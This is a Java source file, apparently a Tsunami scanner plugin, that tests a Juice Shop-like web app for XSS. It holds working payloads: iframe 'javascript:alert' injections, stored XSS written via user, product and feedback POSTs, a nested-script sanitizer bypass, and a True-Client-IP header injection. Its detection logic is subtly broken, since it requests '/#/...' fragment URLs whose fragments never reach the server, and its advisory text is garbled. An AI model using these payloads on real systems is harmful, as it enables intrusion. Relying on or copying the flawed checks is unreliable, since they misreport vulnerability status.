/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.protobuf.ByteString;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.tsunami.common.net.http.HttpHeaders;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.Clock;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "XssdetectorpluginDetector",
    version = "0.1",
    description = "Detects XssDetectorPlugin vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = XssdetectorpluginDetectorBootstrapModule.class)
public final class XssdetectorpluginDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public XssdetectorpluginDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Xssdetectorplugin Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;
    
    try {
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Accept", "application/json")
            .addHeader("Content-Type", "application/json")
            .build();
        
        // Test 1: DOM XSS via search parameter
        if (testDomXss(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 2: Reflected XSS via track-result id parameter
        if (testReflectedXss(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 3: Persistent XSS via user registration
        if (testPersistentXssUsers(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 4: Persistent XSS via product creation
        if (testPersistentXssProducts(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 5: XSS via contact form with sanitizer bypass
        if (testSanitizerBypassXss(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 6: XSS via HTTP header injection
        if (testHeaderXss(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        return successfulAttacks > 0;
        
    } catch (IOException e) {
        logger.atWarning().log(
            format("XSS test failed on '%s': %s", networkService, e.getMessage()));
        return false;
    }
}

private boolean testDomXss(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String payload = "<iframe src=\"javascript:alert('xss')\">"; 
    HttpResponse response = httpClient.send(
        HttpRequest.get(
            targetUri + "/rest/products/search?q=" 
                + URLEncoder.encode(payload, StandardCharsets.UTF_8))
            .setHeaders(headers)
            .build(),
        networkService);
    
    if (response.status().code() == 200) {
        String body = response.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        return body.contains("<iframe src=\"javascript:alert('xss')\">") || 
               body.contains("javascript:alert");
    }
    return false;
}

private boolean testReflectedXss(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String payload = "<iframe src=\"javascript:alert('xss')\">"; 
    HttpResponse response = httpClient.send(
        HttpRequest.get(
            targetUri + "/#/track-result?id=" 
                + URLEncoder.encode(payload, StandardCharsets.UTF_8))
            .setHeaders(headers)
            .build(),
        networkService);
    
    if (response.status().code() == 200) {
        String body = response.bodyBytes()
            .map(bs -> bs.toStringUtf8())
            .orElse("");
        return body.contains("<iframe") && body.contains("javascript:alert");
    }
    return false;
}

private boolean testPersistentXssUsers(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String payload = "{\"email\": \"<iframe src=\\\"javascript:alert('xss')\\\">\", \"password\": \"xss\"}";
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/api/Users")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(payload))
            .build(),
        networkService);
    
    // Check if user creation was successful (status 200 or 201)
    if (response.status().code() == 200 || response.status().code() == 201) {
        // Test if XSS payload is reflected in admin panel
        HttpResponse adminResponse = httpClient.send(
            HttpRequest.get(targetUri + "/#/administration")
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (adminResponse.status().code() == 200) {
            String body = adminResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            return body.contains("<iframe") && body.contains("javascript:alert");
        }
    }
    return false;
}

private boolean testPersistentXssProducts(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String payload = "{\"name\": \"XSS\", \"description\": \"<iframe src=\\\"javascript:alert('xss')\\\">\", \"price\": 47.11}";
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/api/Products")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(payload))
            .build(),
        networkService);
    
    // Check if product creation was successful
    if (response.status().code() == 200 || response.status().code() == 201) {
        // Test if XSS payload is reflected in search results
        HttpResponse searchResponse = httpClient.send(
            HttpRequest.get(targetUri + "/#/search")
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (searchResponse.status().code() == 200) {
            String body = searchResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            return body.contains("<iframe") && body.contains("javascript:alert");
        }
    }
    return false;
}

private boolean testSanitizerBypassXss(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String payload = "{\"comment\": \"<<script>Foo</script>iframe src=\\\"javascript:alert('xss')\\\">\", \"rating\": 5}";
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/api/Feedbacks")
            .setHeaders(headers)
            .setRequestBody(ByteString.copyFromUtf8(payload))
            .build(),
        networkService);
    
    // Check if feedback submission was successful
    if (response.status().code() == 200 || response.status().code() == 201) {
        // Test if XSS payload is reflected in about page
        HttpResponse aboutResponse = httpClient.send(
            HttpRequest.get(targetUri + "/#/about")
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (aboutResponse.status().code() == 200) {
            String body = aboutResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            return body.contains("<iframe") && body.contains("javascript:alert");
        }
    }
    return false;
}

private boolean testHeaderXss(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    HttpHeaders xssHeaders = HttpHeaders.builder()
        .addHeader("Accept", "application/json")
        .addHeader("Content-Type", "application/json")
        .addHeader("True-Client-IP", "<iframe src=\"javascript:alert('xss')\">") 
        .build();
    
    HttpResponse response = httpClient.send(
        HttpRequest.post(targetUri + "/rest/saveLoginIp")
            .setHeaders(xssHeaders)
            .setRequestBody(ByteString.copyFromUtf8("{}"))
            .build(),
        networkService);
    
    // Check if the request was processed
    if (response.status().code() == 200 || response.status().code() == 201) {
        // Test if XSS payload is reflected in privacy page
        HttpResponse privacyResponse = httpClient.send(
            HttpRequest.get(targetUri + "/#/privacy-security/last-login-ip")
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (privacyResponse.status().code() == 200) {
            String body = privacyResponse.bodyBytes()
                .map(bs -> bs.toStringUtf8())
                .orElse("");
            return body.contains("<iframe") && body.contains("javascript:alert");
        }
    }
    return false;
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("XSSDETECTORPLUGIN_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("XssDetectorPlugin Vulnerability Exposed")
                .setDescription("The application is vulnerable to XssDetectorPlugin attacks.")
                .setRecommendation(
                    "Implement proper input validation, output encoding, Content Security Policy (CSP), and use secure coding practices to prevent XSS attacks"))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("XSSDETECTORPLUGIN_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("XssDetectorPlugin Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to XssDetectorPlugin attacks.")
            .setRecommendation(
                "Implement proper input validation, output encoding, Content Security Policy (CSP), and use secure coding practices to prevent XSS attacks")
        .build());
  }
}